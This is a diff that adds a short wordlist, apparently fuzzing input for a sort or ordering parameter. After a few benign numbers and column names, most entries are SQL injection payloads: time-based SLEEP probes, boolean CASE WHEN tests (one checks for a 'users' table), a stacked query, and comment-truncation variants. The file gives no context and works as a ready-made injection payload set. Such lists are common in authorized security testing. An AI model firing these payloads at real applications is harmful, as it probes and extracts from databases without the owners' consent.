@@ -1,0 +1,25 @@
+1
+2
+3
+10
+100
+1000
+name
+price
+id
+created_at
+updated_at
+(SELECT SLEEP(5))
+(SELECT 1 FROM(SELECT SLEEP(5))a)
+CASE WHEN 1=1 THEN name ELSE price END
+CASE WHEN 1=2 THEN name ELSE price END
+CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN name ELSE price END
+1;SELECT SLEEP(5)--
+1 ASC
+1 DESC
+1,(SELECT SLEEP(5))
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)
+name--
+name#
+name/*
+1 AND SLEEP(5)
